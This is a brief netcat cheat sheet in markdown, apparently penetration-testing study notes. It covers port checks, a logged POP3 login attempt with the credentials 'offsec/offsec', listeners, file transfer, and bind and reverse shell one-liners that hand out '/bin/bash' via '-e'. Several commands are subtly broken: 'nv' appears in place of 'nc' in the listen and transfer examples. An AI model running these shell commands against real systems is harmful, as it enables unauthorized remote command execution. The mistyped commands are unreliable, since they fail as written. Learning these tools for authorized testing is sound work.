---
title: "netcat"
linkTitle: "netcat"
date: 2017-01-05
---

### Check open port

```bash
nc -vz 1.1.1.1 53
nc -vnz 1.1.1.1 53
```

### Interact with pop3 service

```bash
$ nc -v  10.1.1.7 110
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Connected to 10.1.1.7:110.
+OK example.com Cyrus POP3 v2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 server ready <2488404358.1644174792@example.com>
USER offsec
+OK Name is a valid mailbox
PASS offsec
-ERR [AUTH] Invalid login
quit
+OK
```

### Listen

```bash
nv -lnvp 1234
```

on localhost:

```bash
nc -nv -l 127.0.0.1 -p 1234
```

### Transfer

Alice -> Bob

Bob:

```bash
nv -lnvp 1234 > file
```

Alice:

```bash
nv -nv 192.168.1.1 1234 < file
```

### Bind shell

Alice -> Bob

Bob:

```bash
nc -nv -l 127.0.0.1 1234 -e /bin/bash
```

Alice:

```bash
nc -nv 127.0.0.1 1234
```

### Reverse shell

`Alice <- Bob`

Bob:

```bash
nc -nv -l 127.0.0.1 1234
```

Alice:

```bash
nc -nv 127.0.0.1 1234 -e /bin/bash
```
